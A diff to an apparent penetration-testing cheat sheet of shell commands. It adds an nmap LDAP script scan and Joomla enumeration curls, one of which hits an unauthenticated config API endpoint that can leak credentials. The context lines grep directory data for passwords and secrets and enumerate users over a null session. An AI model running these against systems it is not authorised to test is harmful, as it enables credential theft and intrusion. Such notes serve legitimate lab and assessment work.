@@ -121,6 +121,7 @@ ffuf -u https://$DOM/ -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/
 ## Infrastructure
 windapsearch --dc-ip $TARGET --full --computers | grep -Ei 'dns'
 windapsearch --dc-ip $TARGET --full --users --computers | grep -Evi 'bad|LastSet' | grep -Ei 'passw|pwd|key|secret|desc'
+nmap $TARGET --script "ldap* and not brute" -p 389
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
 rpcclient -U "" -N $TARGET -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]' | tee usernames
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
@@ -184,6 +185,10 @@ unzip backup.zip -d .
 [*] WordPress
 wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
+
+[*] Joomla
+curl http://$TARGET/administrator/manifests/files/joomla.xml
+curl -s "http://$TARGET/api/index.php/v1/config/application?public=True" | jq
 
 [*] Git
 export GIT_SSL_NO_VERIFY=true
